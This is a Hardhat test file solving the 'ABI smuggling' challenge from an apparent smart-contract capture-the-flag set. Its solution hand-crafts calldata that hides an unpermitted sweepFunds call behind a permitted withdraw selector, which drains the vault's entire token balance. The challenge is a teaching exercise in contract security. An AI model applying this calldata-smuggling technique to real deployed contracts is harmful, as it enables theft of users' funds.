const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;
    
    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, player, recovery ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // make a call to `execute` in the vault contract with pure abi encoded data
        const withdrawSelector = "0xd9caed12".slice(2).toLowerCase();
        const sweepFundsSelector = "0x85fb709d".slice(2).toLowerCase();
        const executeSelector = "0x1cff79cd".slice(2).toLowerCase();

        await player.sendTransaction({
            to: vault.address,
            value: 0,
            gasLimit: 30000000,
            data: `0x${
                executeSelector // selector (4 bytes)
            }${
                ethers.utils.hexZeroPad(vault.address, 32).slice(2).toLowerCase() // vault address (32 bytes)
            }${
                `${
                    ethers.utils.hexZeroPad(100, 32).slice(2).toLowerCase() // data offset (location) value = 32 * 3 + 4 (32 bytes)
                }${
                    ethers.utils.hexZeroPad(0, 32).slice(2).toLowerCase() // zeros (32 bytes)
                }${
                    withdrawSelector // withdraw selector at location = 4 + (32 * 3) (4 bytes)
                }${
                    ethers.utils.hexZeroPad(68, 32).slice(2).toLowerCase() // data length value = 32 * 2 + 4 (32 bytes)
                }${
                    sweepFundsSelector // sweepFunds selector (4 bytes)
                }${
                    ethers.utils.hexZeroPad(recovery.address, 32).slice(2).toLowerCase() // recipient address (32 bytes)
                }${
                    ethers.utils.hexZeroPad(token.address, 32).slice(2).toLowerCase() // token address (32 bytes)
                }`
            }`
        });
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
